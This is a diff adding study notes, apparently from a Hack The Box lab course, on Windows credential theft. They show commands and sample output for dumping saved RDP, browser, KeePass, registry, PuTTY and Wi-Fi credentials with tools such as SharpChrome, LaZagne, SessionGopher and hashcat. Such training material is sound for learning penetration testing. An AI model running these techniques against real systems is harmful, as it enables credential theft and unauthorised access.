@@ -3065,3 +3065,163 @@ Potential credential sources:
 
 ---
 
+# 🔐 Further Credential Theft
+
+## 📌 Context
+- Many techniques exist to obtain credentials on Windows systems.
+- Common sources: saved credentials, browsers, password managers, email, registry, wireless profiles.
+- Goal: escalate privileges, move laterally, or access sensitive data.
+
+
+
+## 🗝️ Cmdkey Saved Credentials
+
+### List saved credentials
+```cmd
+C:\htb> cmdkey /list
+```
+
+**Output:**
+```
+Target: LegacyGeneric:target=TERMSRV/SQL01
+Type: Generic
+User: inlanefreight\bob
+```
+
+- Saved credentials used automatically in RDP connections.
+- Can reuse with `runas`:
+```powershell
+PS C:\htb> runas /savecred /user:inlanefreight\bob "COMMAND HERE"
+```
+
+
+
+## 🌐 Browser Credentials (Chrome)
+
+### Retrieve saved logins with SharpChrome
+```powershell
+PS C:\htb> .\SharpChrome.exe logins /unprotect
+```
+
+**Output:**
+```
+Chrome Credential:
+Path: C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Login Data
+URL: https://vc01.inlanefreight.local/ui
+Username: bob@inlanefreight.local
+Password: Welcome1
+```
+
+- Note: Activity may trigger security events (4688, 16385, 4662, 4663).
+
+## 🔑 Password Managers
+
+- Examples: KeePass, 1Password, Thycotic, CyberArk.
+- KeePass databases (`.kdbx`) often protected only by a master password.
+
+### Extract KeePass hash
+```bash
+python2.7 keepass2john.py ILFREIGHT_Help_Desk.kdbx
+```
+
+### Crack with Hashcat
+```bash
+hashcat -m 13400 keepass_hash rockyou.txt
+```
+
+**Output:**
+```
+Recovered: panther1
+```
+
+## 📧 Email Credentials
+
+- Use **MailSniper** to search Exchange inboxes for keywords: `pass`, `creds`, `credentials`.
+
+
+## 🛠️ LaZagne Tool
+
+### Help menu
+```powershell
+PS C:\htb> .\lazagne.exe -h
+```
+
+### Run all modules
+```powershell
+PS C:\htb> .\lazagne.exe all
+```
+
+**Output:**
+```
+WinSCP: root / Summer2020!
+Credman: jordan_adm / !QAZzaq1
+```
+
+## 📡 SessionGopher
+
+- Extracts saved sessions for PuTTY, WinSCP, FileZilla, SuperPuTTY, RDP.
+
+### Run locally
+```powershell
+PS C:\htb> Import-Module .\SessionGopher.ps1
+PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
+```
+
+**Output:**
+```
+PuTTY Session: nix03.inlanefreight.local
+SuperPuTTY: srvadmin / Port 22
+```
+
+## 📝 Clear-Text Passwords in Registry
+
+### Windows AutoLogon
+Registry path:
+```
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
+```
+
+Example:
+```cmd
+C:\htb> reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+```
+
+**Output:**
+```
+AutoAdminLogon REG_SZ 1
+DefaultUserName REG_SZ htb-student
+DefaultPassword REG_SZ HTB_@cademy_stdnt!
+```
+
+### PuTTY Sessions
+```powershell
+PS C:\htb> reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions
+```
+
+**Output:**
+```
+ProxyUsername REG_SZ administrator
+ProxyPassword REG_SZ 1_4m_th3_@cademy_4dm1n!
+```
+
+
+
+## 📶 Wi-Fi Passwords
+
+### List profiles
+```cmd
+C:\htb> netsh wlan show profile
+```
+
+### Retrieve key
+```cmd
+C:\htb> netsh wlan show profile ilfreight_corp key=clear
+```
+
+**Output:**
+```
+Key Content : ILFREIGHTWIFI-CORP123908!
+```
+
+---
+
